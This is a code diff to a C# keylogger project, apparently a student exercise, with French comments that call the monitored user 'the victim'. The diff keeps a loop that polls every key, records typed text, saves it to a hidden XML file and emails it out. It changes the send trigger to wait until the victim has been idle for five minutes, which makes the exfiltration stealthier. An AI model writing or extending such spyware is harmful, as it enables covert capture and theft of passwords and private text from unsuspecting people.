@@ -12,6 +12,12 @@ namespace ProjetKeyLogger
         //Texte saisie depuis le dernier clic ou touche "entré" ou temps > 30 secondes
         private CollectionEnregistrement collection_enregistrement;
 
+        //Temps durant lequel la boucle de capture va attendre
+        private int sleep_time;
+
+        //temps d'innactivité maximum avant l'envoi de mail
+        int temps_inactivite_max;
+
         private string file_path;
 
         //Initialisation du nombre de caractere tapé
@@ -30,6 +36,12 @@ namespace ProjetKeyLogger
         {
             //initialisation du nombre de caractere
             nb_caractere_tape = 0;
+
+            //Le temps est initialisé (En miliseconde)
+            sleep_time = 3;
+
+            //on initialise le temps d'inactivité maximum (En minute)
+            temps_inactivite_max = 5;
 
             //On initialise la collection
             collection_enregistrement = new CollectionEnregistrement();
@@ -55,13 +67,14 @@ namespace ProjetKeyLogger
             bool ctrl = false;
             bool altgr = false;
 
-
+            //Initialisation du moment de la derniere activité de l'ordinateur de la victime
+            DateTime date_dernier_activite = DateTime.Now;
 
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
-               
+
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
-                Thread.Sleep(3); //nombre en miliseconde
+                Thread.Sleep(sleep_time); //nombre en miliseconde
 
                 //verification de l'état de chaque touche (up ou down)
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
@@ -71,6 +84,10 @@ namespace ProjetKeyLogger
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
+
+                        //le temps d'innactivité est reinitialisé
+                        date_dernier_activite = DateTime.Now;
+
                         switch (codeASCII)
                         {
                             //Si touche Entrée
@@ -80,26 +97,6 @@ namespace ProjetKeyLogger
 
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
-
-                                //SI le nombre de caracteres tapés a dépassé la limite
-                                if (nb_caractere_tape > 100)
-                                {
-                                    //On enregistre le contenue en xml
-                                    collection_enregistrement.saveToXml(file_path);
-
-                                    //on cache le xml
-                                    File.SetAttributes(file_path, FileAttributes.Hidden);
-                                    //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
-
-                                    //On reinitialise le nombre de caracteres
-                                    nb_caractere_tape = 0;
-
-                                    //On réinitialise la collection
-                                    collection_enregistrement = new CollectionEnregistrement();
-
-                                    //envoie du mail
-                                    envoieMail();
-                                }
 
                                 break;
 
@@ -349,14 +346,41 @@ namespace ProjetKeyLogger
                                 enregistrement.ajouterContenu((char)codeASCII);
                                 //On incrémente le nombre de caracteres tapé
                                 //!!!A mettre a chaque fois qu'un caractere est tapé!!!
-                                nb_caractere_tape += 1;
+                               
                                 break;
                         }
-
+                        nb_caractere_tape += 1;
                     }
-                   
-                }
 
+                    //SI le nombre de caracteres tapés a dépassé la limite
+                    //Et si le temps d'innactivité a dépassé 5 minutes
+                    if (nb_caractere_tape > 100 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
+                    {
+                        //On ajoute l'enregistrement a la collection
+                        collection_enregistrement.ajouterNew(enregistrement);
+
+                        //On réinitialise l'enregistrement
+                        enregistrement = new Enregistrement();
+
+                        //On enregistre le contenue en xml
+                        collection_enregistrement.saveToXml(file_path);
+
+                        //on cache le xml
+                        File.SetAttributes(file_path, FileAttributes.Hidden);
+                        //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
+
+                        //On reinitialise le nombre de caracteres
+                        nb_caractere_tape = 0;
+
+                        //On réinitialise la collection
+                        collection_enregistrement = new CollectionEnregistrement();
+
+                        //envoie du mail
+                        envoieMail();
+                    }
+                    
+                }
+                                
             }
         }
 
